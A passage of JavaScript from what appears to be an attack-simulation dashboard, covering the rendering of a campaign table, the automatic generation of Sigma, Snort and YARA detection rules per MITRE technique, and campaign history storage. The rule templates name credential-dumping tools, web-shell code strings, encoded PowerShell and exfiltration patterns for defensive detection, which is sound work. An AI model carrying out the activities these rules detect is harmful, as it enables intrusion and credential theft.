      if (c.type === 'entry') details = c.host + ' via ' + c.technique;
      else if (c.type === 'pivot') details = c.from + ' -> ' + c.to + ' via ' + c.technique;
      else details = c.objective + ' on ' + c.host;
      html += '<tr style="border-bottom:1px solid var(--line)">';
      html += '<td style="padding:6px;color:var(--mut)">T' + c.tick + '</td>';
      html += '<td style="padding:6px;color:' + color + ';font-weight:600">' + esc(c.agent) + '</td>';
      html += '<td style="padding:6px">' + esc(c.type) + '</td>';
      html += '<td style="padding:6px">' + esc(details) + '</td>';
      html += '<td style="padding:6px;color:var(--acc)">' + esc(c.mitre || '--') + '</td>';
      html += '</tr>';
    });
    html += '</tbody></table></div>';
    container.innerHTML = html;
  }

  // ========================================================================
  // DETECTION RULES TAB — Auto-generate Sigma/Snort/YARA
  // ========================================================================
  function renderDetectionsTab(container) {
    var usedTechniques = [];
    var seen = {};
    engine.log.forEach(function(e) {
      if (e.mitre && !seen[e.mitre]) {
        seen[e.mitre] = true;
        usedTechniques.push({ mitre: e.mitre, msg: e.msg, agent: e.agent });
      }
    });
    if (usedTechniques.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Run an operation first to generate detection rules.</p>';
      return;
    }

    var sigmaRules = [];
    var snortRules = [];
    var yaraRules = [];
    var sid = 100001;

    var sigmaTemplates = {
      'T1046': { title: 'Port Scanning Activity', product: 'firewall', service: 'firewall', eventId: '', field: 'action: blocked', level: 'medium', tactic: 'discovery' },
      'T1210': { title: 'Exploitation of Remote Service', product: 'windows', service: 'sysmon', eventId: '3', field: 'DestinationPort|contains: "445,3389,8080"', level: 'high', tactic: 'lateral-movement' },
      'T1003': { title: 'LSASS Memory Access (Credential Dumping)', product: 'windows', service: 'sysmon', eventId: '10', field: 'TargetImage|endswith: "lsass.exe"', level: 'critical', tactic: 'credential-access' },
      'T1550.002': { title: 'Pass-the-Hash Lateral Movement', product: 'windows', service: 'security', eventId: '4624', field: 'LogonType: 9', level: 'high', tactic: 'lateral-movement' },
      'T1047': { title: 'WMI Remote Execution', product: 'windows', service: 'sysmon', eventId: '1', field: 'ParentImage|endswith: "wmiprvse.exe"', level: 'high', tactic: 'execution' },
      'T1547.001': { title: 'Registry Run Key Persistence', product: 'windows', service: 'sysmon', eventId: '13', field: 'TargetObject|contains: "CurrentVersion\\Run"', level: 'medium', tactic: 'persistence' },
      'T1053.005': { title: 'Scheduled Task Creation', product: 'windows', service: 'security', eventId: '4698', field: 'TaskName|contains: "*"', level: 'medium', tactic: 'persistence' },
      'T1505.003': { title: 'Web Shell Activity', product: 'linux', service: 'sysmon', eventId: '11', field: 'TargetFilename|contains: "wwwroot,htdocs,www"', level: 'critical', tactic: 'persistence' },
      'T1190': { title: 'Exploit Public-Facing Application', product: 'webserver', service: 'access_log', eventId: '', field: 'status_code: "500" AND path|contains: "..",";","${jndi"', level: 'critical', tactic: 'initial-access' },
      'T1048.002': { title: 'Large Data Exfiltration via HTTPS', product: 'proxy', service: 'proxy', eventId: '', field: 'bytes_out|gt: 100000000', level: 'high', tactic: 'exfiltration' },
      'T1558.001': { title: 'Golden Ticket Usage', product: 'windows', service: 'security', eventId: '4769', field: 'TicketEncryptionType: 0x17', level: 'critical', tactic: 'credential-access' },
      'T1110': { title: 'Brute Force Authentication', product: 'windows', service: 'security', eventId: '4625', field: 'count|gt: 5', level: 'medium', tactic: 'credential-access' },
      'T1021.006': { title: 'WinRM Remote Session', product: 'windows', service: 'winrm', eventId: '91', field: 'EventType: connection', level: 'medium', tactic: 'lateral-movement' },
      'T1595': { title: 'Active Scanning Reconnaissance', product: 'firewall', service: 'firewall', eventId: '', field: 'dest_port|count|gt: 20', level: 'low', tactic: 'reconnaissance' },
      'T1486': { title: 'Ransomware File Encryption', product: 'windows', service: 'sysmon', eventId: '11', field: 'TargetFilename|endswith: ".encrypted,.locked,.crypt"', level: 'critical', tactic: 'impact' },
    };

    usedTechniques.forEach(function(t) {
      var tmpl = sigmaTemplates[t.mitre];
      if (tmpl) {
        var sigma = 'title: Detect ' + tmpl.title + '\n';
        sigma += 'id: hydra-' + t.mitre.toLowerCase().replace(/\./g, '-') + '\n';
        sigma += 'status: experimental\n';
        sigma += 'description: Detects ' + tmpl.title.toLowerCase() + ' activity observed during HYDRA operation\n';
        sigma += 'logsource:\n';
        sigma += '    product: ' + tmpl.product + '\n';
        sigma += '    service: ' + tmpl.service + '\n';
        sigma += 'detection:\n';
        sigma += '    selection:\n';
        if (tmpl.eventId) sigma += '        EventID: ' + tmpl.eventId + '\n';
        sigma += '        ' + tmpl.field + '\n';
        sigma += '    condition: selection\n';
        sigma += 'level: ' + tmpl.level + '\n';
        sigma += 'tags:\n';
        sigma += '    - attack.' + tmpl.tactic + '\n';
        sigma += '    - attack.' + t.mitre + '\n';
        sigmaRules.push({ mitre: t.mitre, title: tmpl.title, rule: sigma });
      }

      // Snort rules for network techniques
      var snortMap = {
        'T1046': 'alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"HYDRA - Port Scan Detected"; flags:S; threshold:type both,track by_src,count 20,seconds 60; sid:' + sid++ + '; rev:1;)',
        'T1210': 'alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"HYDRA - SMB Exploit Attempt"; content:"|FF|SMB"; offset:4; content:"|73|"; distance:0; sid:' + sid++ + '; rev:1;)',
        'T1190': 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"HYDRA - Web Application Exploit"; content:".."; http_uri; content:"|3b|"; http_uri; sid:' + sid++ + '; rev:1;)',
        'T1048.002': 'alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"HYDRA - Large HTTPS Exfiltration"; dsize:>65000; threshold:type both,track by_src,count 100,seconds 300; sid:' + sid++ + '; rev:1;)',
        'T1071.001': 'alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:"HYDRA - C2 Beacon Pattern"; flow:to_server,established; content:"POST"; http_method; threshold:type both,track by_src,count 10,seconds 600; sid:' + sid++ + '; rev:1;)',
        'T1048.003': 'alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:"HYDRA - DNS Tunneling Detected"; content:"|00 10|"; byte_test:1,>,50,0,relative; sid:' + sid++ + '; rev:1;)',
        'T1110': 'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"HYDRA - SSH Brute Force"; flow:to_server,established; threshold:type both,track by_src,count 5,seconds 120; sid:' + sid++ + '; rev:1;)',
      };
      if (snortMap[t.mitre]) {
        snortRules.push({ mitre: t.mitre, rule: snortMap[t.mitre] });
      }

      // YARA rules for file-based techniques
      var yaraMap = {
        'T1003': 'rule HYDRA_CredDump_' + t.mitre.replace(/\./g, '_') + ' {\n  meta:\n    description = "Detects credential dumping tools"\n    mitre = "' + t.mitre + '"\n  strings:\n    $s1 = "sekurlsa" ascii wide nocase\n    $s2 = "logonpasswords" ascii wide nocase\n    $s3 = "lsadump" ascii wide nocase\n    $s4 = "mimikatz" ascii wide nocase\n    $s5 = "pypykatz" ascii wide nocase\n  condition:\n    any of them\n}',
        'T1505.003': 'rule HYDRA_WebShell {\n  meta:\n    description = "Detects common web shell patterns"\n    mitre = "T1505.003"\n  strings:\n    $php1 = "system($_" ascii\n    $php2 = "exec($_" ascii\n    $php3 = "passthru(" ascii\n    $php4 = "eval(base64_decode" ascii\n    $jsp1 = "Runtime.getRuntime().exec" ascii\n    $asp1 = "eval(Request" ascii\n  condition:\n    any of them\n}',
        'T1547.001': 'rule HYDRA_Registry_Persistence {\n  meta:\n    description = "Detects registry persistence artifacts"\n    mitre = "T1547.001"\n  strings:\n    $s1 = "CurrentVersion\\\\Run" ascii wide nocase\n    $s2 = "CurrentVersion\\\\RunOnce" ascii wide nocase\n    $s3 = "reg add" ascii nocase\n  condition:\n    2 of them\n}',
        'T1486': 'rule HYDRA_Ransomware_Indicators {\n  meta:\n    description = "Detects ransomware encryption indicators"\n    mitre = "T1486"\n  strings:\n    $s1 = "Your files have been encrypted" ascii wide nocase\n    $s2 = "bitcoin" ascii wide nocase\n    $s3 = "decrypt" ascii wide nocase\n    $s4 = ".onion" ascii\n    $ext1 = ".locked" ascii\n    $ext2 = ".encrypted" ascii\n    $ext3 = ".crypt" ascii\n  condition:\n    2 of ($s*) or any of ($ext*)\n}',
        'T1059.001': 'rule HYDRA_Encoded_PowerShell {\n  meta:\n    description = "Detects encoded or obfuscated PowerShell"\n    mitre = "T1059.001"\n  strings:\n    $s1 = "-EncodedCommand" ascii wide nocase\n    $s2 = "-enc " ascii wide nocase\n    $s3 = "FromBase64String" ascii wide\n    $s4 = "Invoke-Expression" ascii wide nocase\n    $s5 = "IEX(" ascii wide\n  condition:\n    any of them\n}',
      };
      if (yaraMap[t.mitre]) {
        yaraRules.push({ mitre: t.mitre, rule: yaraMap[t.mitre] });
      }
    });

    var html = '<h2 style="font-size:1rem;font-weight:700;letter-spacing:.05em;margin:0 0 4px">AUTO-GENERATED DETECTION RULES</h2>' +
      '<p style="font-size:.75rem;color:var(--mut);margin:0 0 16px">' + sigmaRules.length + ' Sigma rules, ' + snortRules.length + ' Snort/Suricata rules, ' + yaraRules.length + ' YARA rules generated from operation results.</p>';

    // Sigma rules
    if (sigmaRules.length > 0) {
      html += '<h3 style="font-size:.85rem;font-weight:600;margin:16px 0 8px;color:var(--acc)">SIGMA RULES</h3>';
      sigmaRules.forEach(function(r, i) {
        html += '<div style="margin-bottom:12px">' +
          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
            '<span style="font-size:.72rem;font-weight:600">' + esc(r.title) + '</span>' +
            '<span style="font-size:.62rem;color:var(--acc)">' + esc(r.mitre) + '</span>' +
            '<span style="flex:1"></span>' +
            '<button class="hy-btn hy-btn-ghost" data-copy="sigma-' + i + '" style="padding:3px 8px;font-size:.6rem">COPY</button>' +
          '</div>' +
          '<pre id="sigma-' + i + '" style="background:rgba(0,0,0,0.3);border:1px solid var(--line);border-radius:3px;padding:10px;font-size:.68rem;overflow-x:auto;color:var(--acc);margin:0">' + esc(r.rule) + '</pre>' +
        '</div>';
      });
    }

    // Snort rules
    if (snortRules.length > 0) {
      html += '<h3 style="font-size:.85rem;font-weight:600;margin:16px 0 8px;color:#ff9100">SNORT / SURICATA RULES</h3>';
      snortRules.forEach(function(r, i) {
        html += '<div style="margin-bottom:8px">' +
          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
            '<span style="font-size:.65rem;color:var(--acc)">' + esc(r.mitre) + '</span>' +
            '<span style="flex:1"></span>' +
            '<button class="hy-btn hy-btn-ghost" data-copy="snort-' + i + '" style="padding:3px 8px;font-size:.6rem">COPY</button>' +
          '</div>' +
          '<pre id="snort-' + i + '" style="background:rgba(0,0,0,0.3);border:1px solid var(--line);border-radius:3px;padding:10px;font-size:.68rem;overflow-x:auto;color:#ff9100;margin:0">' + esc(r.rule) + '</pre>' +
        '</div>';
      });
    }

    // YARA rules
    if (yaraRules.length > 0) {
      html += '<h3 style="font-size:.85rem;font-weight:600;margin:16px 0 8px;color:#00e676">YARA RULES</h3>';
      yaraRules.forEach(function(r, i) {
        html += '<div style="margin-bottom:12px">' +
          '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
            '<span style="font-size:.65rem;color:var(--acc)">' + esc(r.mitre) + '</span>' +
            '<span style="flex:1"></span>' +
            '<button class="hy-btn hy-btn-ghost" data-copy="yara-' + i + '" style="padding:3px 8px;font-size:.6rem">COPY</button>' +
          '</div>' +
          '<pre id="yara-' + i + '" style="background:rgba(0,0,0,0.3);border:1px solid var(--line);border-radius:3px;padding:10px;font-size:.68rem;overflow-x:auto;color:#00e676;margin:0">' + esc(r.rule) + '</pre>' +
        '</div>';
      });
    }

    container.innerHTML = html;

    // Wire copy buttons
    container.querySelectorAll('[data-copy]').forEach(function(btn) {
      btn.onclick = function() {
        var pre = container.querySelector('#' + btn.dataset.copy);
        if (pre) {
          navigator.clipboard.writeText(pre.textContent).then(function() {
            btn.textContent = 'COPIED';
            setTimeout(function() { btn.textContent = 'COPY'; }, 1500);
          });
        }
      };
    });
  }

  // ========================================================================
  // CAMPAIGN HISTORY (localStorage)
  // ========================================================================
  function saveCampaign() {
    if (engine.tick < 5) return;
    var campaigns = [];
    try { campaigns = JSON.parse(localStorage.getItem('hydra_campaigns') || '[]'); } catch(e) {}
    campaigns.push({
      ts: new Date().toISOString(),
      env: engine.hosts.length > 0 ? (engine.hosts[0].segment || 'custom') : 'unknown',
      hostCount: engine.hosts.length,
      compromised: engine.hosts.filter(function(h) { return h.sessions.length > 0; }).length,
      creds: engine.intel.credentials.length,
      vulns: engine.intel.vulns.length,
      ticks: engine.tick,
      score: engine.threatScore,
      controls: engine.hosts.reduce(function(acc, h) { return acc + h.controls.length; }, 0),
    });
    if (campaigns.length > 20) campaigns = campaigns.slice(-20);
    try { localStorage.setItem('hydra_campaigns', JSON.stringify(campaigns)); } catch(e) {}
  }

  renderUI();
}
